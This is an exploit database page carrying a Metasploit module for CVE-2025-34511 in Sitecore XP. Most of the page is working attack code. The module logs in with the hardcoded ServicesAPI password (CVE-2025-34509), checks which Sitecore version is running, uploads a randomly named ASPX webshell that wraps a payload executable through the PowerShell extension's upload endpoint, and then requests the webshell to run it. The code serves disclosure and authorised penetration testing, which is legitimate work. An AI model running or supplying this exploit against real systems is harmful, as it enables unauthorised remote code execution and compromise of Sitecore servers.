---
title: Sitecore XP Post-Authentication File Upload
url: https://cxsecurity.com/issue/WLB-2025090008
source: CXSECURITY Database RSS Feed - CXSecurity.com
date: 2025-09-15
fetch_date: 2025-10-02T20:09:50.241471
---

# Sitecore XP Post-Authentication File Upload

[![Home Page](https://cert.cx/cxstatic/images/12018/cxseci.png)](https://cxsecurity.com/)

* [Home](https://cxsecurity.com/)
* Bugtraq
  + [Full List](https://cxsecurity.com/wlb/)
  + [Only Bugs](https://cxsecurity.com/bugs/)
  + [Only Tricks](https://cxsecurity.com/tricks/)
  + [Only Exploits](https://cxsecurity.com/exploit/)
  + [Only Dorks](https://cxsecurity.com/dorks/)
  + [Only CVE](https://cxsecurity.com/cvelist/)
  + [Only CWE](https://cxsecurity.com/cwelist/)
  + [Fake Notes](https://cxsecurity.com/bogus/)
  + [Ranking](https://cxsecurity.com/best/1/)
* CVEMAP
  + [Full List](https://cxsecurity.com/cvemap/)
  + [Show Vendors](https://cxsecurity.com/cvevendors/)
  + [Show Products](https://cxsecurity.com/cveproducts/)
  + [CWE Dictionary](https://cxsecurity.com/allcwe/)
  + [Check CVE Id](https://cxsecurity.com/cve/)
  + [Check CWE Id](https://cxsecurity.com/cwe/)
* Search
  + [Bugtraq](https://cxsecurity.com/search/)
  + [CVEMAP](https://cxsecurity.com/search/cve/)
  + [By author](https://cxsecurity.com/search/author/)
  + [CVE Id](https://cxsecurity.com/cve/)
  + [CWE Id](https://cxsecurity.com/cwe/)
  + [By vendors](https://cxsecurity.com/cvevendors/)
  + [By products](https://cxsecurity.com/cveproducts/)
* RSS
  + [Bugtraq](https://cxsecurity.com/wlb/rss/all/)
  + [CVEMAP](https://cxsecurity.com/cverss/fullmap/)
  + [CVE Products](https://cxsecurity.com/cveproducts/)
  + [Bugs](https://cxsecurity.com/wlb/rss/vulnerabilities/)
  + [Exploits](https://cxsecurity.com/wlb/rss/exploit/)
  + [Dorks](https://cxsecurity.com/wlb/rss/dorks/)
* More
  + [cIFrex](http://cifrex.org/)
  + [Facebook](https://www.facebook.com/cxsec)
  + [Twitter](https://twitter.com/cxsecurity)
  + [Donate](https://cxsecurity.com/donate/)
  + [About](https://cxsecurity.com/wlb/about/)

* [Submit](https://cxsecurity.com/wlb/add/)

|  |  |  |  |
| --- | --- | --- | --- |
|  |  | |  | | --- | | **Sitecore XP Post-Authentication File Upload** **2025.09.14**  Credit:  **[Piotr Bazydlo](https://cxsecurity.com/author/Piotr%2BBazydlo/1/)**  Risk: **High**  Local: **No**  Remote: ****Yes****  CVE: **[CVE-2025-34511](https://cxsecurity.com/cveshow/CVE-2025-34511/ "Click to see CVE-2025-34511")**  CWE: **N/A** | |

##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
class MetasploitModule < Msf::Exploit::Remote
Rank = ExcellentRanking
include Msf::Exploit::Remote::HTTP::SitecoreXp
include Msf::Exploit::CmdStager
prepend Msf::Exploit::Remote::AutoCheck
def initialize(info = {})
super(
update\_info(
info,
'Name' => 'Sitecore XP CVE-2025-34511 Post-Authentication File Upload',
'Description' => %q{
This module exploits CVE-2025-34511, a file upload vulnerability in PowerShell extensions. The module exploits also CVE-2025-34509 - hardcoded credentials of ServicesAPI account - to gain foothold.
},
'License' => MSF\_LICENSE,
'Author' => [
'Piotr Bazydlo', # Discovery
'msutovsky-r7' # Module Creator
],
'References' => [
[ 'CVE', '2025-34511' ],
['URL', 'https://labs.watchtowr.com/is-b-for-backdoor-pre-auth-rce-chain-in-sitecore-experience-platform'],
['URL', 'https://support.sitecore.com/kb?id=kb\_article\_view&sysparm\_article=KB1003667']
],
'Platform' => 'win',
'Arch' => [ARCH\_X86, ARCH\_X64],
'Targets' => [
[
'Windows',
{
'Arch' => [ARCH\_X86, ARCH\_X64]
}
]
],
'DefaultOptions' => {
'RPORT' => 443,
'SSL' => true
},
'DisclosureDate' => '2025-06-17',
'DefaultTarget' => 0,
'Notes' => {
'Stability' => [CRASH\_SAFE],
'Reliability' => [REPEATABLE\_SESSION],
'SideEffects' => [IOC\_IN\_LOGS, ARTIFACTS\_ON\_DISK]
}
)
)
register\_options([
OptString.new('TARGETURI', [true, 'Path to the vulnerable endpoint', '/']),
])
end
def check
return Exploit::CheckCode::Unknown('Could not log in, application might not be Sitecore') unless login\_identitysrv('ServicesAPI', 'b')
@is\_logged = true
return Exploit::CheckCode::Safe('Could not get elevated cookies') unless get\_identity\_cookies
@is\_elevated = true
sitecore\_version = get\_version
res = send\_request\_cgi({
'uri' => normalize\_uri('sitecore%20modules', 'Shell', 'PowerShell', 'UploadFile', 'PowerShellUploadFile2.aspx'),
'method' => 'GET',
'vars\_get' => { 'hdl' => '1245516121' }
})
return Exploit::CheckCode::Safe('PowerShell extension not detected, might not be installed in target Sitecore instance') unless res&.code == 200
return Exploit::CheckCode::Vulnerable("Sitecore version detected #{sitecore\_version}, which is vulnerable") if sitecore\_version.between?(Rex::Version.new('10.0.0'), Rex::Version.new('10.4'))
Exploit::CheckCode::Safe("Detected Sitecore version #{sitecore\_version}, which is not vulnerable")
end
def upload\_webshell
@webshell = "#{Rex::Text.rand\_text\_alpha(15)}.aspx"
@item\_uri = Rex::Text.rand\_text\_alpha(8)
exe = generate\_payload\_exe
asp = Msf::Util::EXE.to\_exe\_aspx(exe)
data\_post = Rex::MIME::Message.new
data\_post.add\_part(@item\_uri, nil, nil, %(form-data; name="ItemUri"))
data\_post.add\_part('en', nil, nil, %(form-data; name="LanguageName"))
data\_post.add\_part('0', nil, nil, %(form-data; name="Overwrite"))
data\_post.add\_part('0', nil, nil, %(form-data; name="Unpack"))
data\_post.add\_part('en', nil, nil, %(form-data; name="Versioned"))
data\_post.add\_part(asp, 'text/plain', nil, %(form-data; name="#{@item\_uri}"; filename="#{@webshell}"))
res = send\_request\_cgi({
'method' => 'POST',
'uri' => normalize\_uri('sitecore%20modules', 'Shell', 'PowerShell', 'UploadFile', 'PowerShellUploadFile2.aspx'),
'vars\_get' => { 'hdl' => '1245516121' },
'data' => data\_post.to\_s,
'ctype' => "multipart/form-data; boundary=#{data\_post.bound}"
})
return false unless res&.code == 200
true
end
def trigger\_webshell
send\_request\_cgi({
'uri' => normalize\_uri('sitecore%20modules', 'Shell', 'PowerShell', 'UploadFile', @item\_uri, @webshell),
'method' => 'GET'
})
end
def exploit
if !@is\_logged && !login\_identitysrv('ServicesAPI', 'b')
fail\_with(Failure::NoAccess, 'Failed to log in, check the credentials')
end
if !@is\_elevated && !get\_identity\_cookies
fail\_with(Failure::Unknown, 'Failed to get elevated cookies')
end
fail\_with(Failure::PayloadFailed, 'Failed to upload webshell') unless upload\_webshell
trigger\_webshell
end
end

[**See this note in RAW Version**](https://cxsecurity.com/ascii/WLB-2025090008)

[Tweet](https://twitter.com/share)

Vote for this issue:
 1
 0

100%

0%

#### **Thanks for you vote!**

#### **Thanks for you comment!** Your message is in quarantine 48 hours.

Comment it here.

Nick (\*)

Email (\*)

Video

Text (\*)

(\*) - required fields.
Cancel
Submit

|  |  |
| --- | --- |
|  | **{{ x.nick }}** ![]() | Date: {{ x.ux \* 1000 | date:'yyyy-MM-dd' }} *{{ x.ux \* 1000 | date:'HH:mm' }}* CET+1  ---   {{ x.comment }} |

Show all comments

---

Copyright **2025**, cxsecurity.com

|  |

Back to Top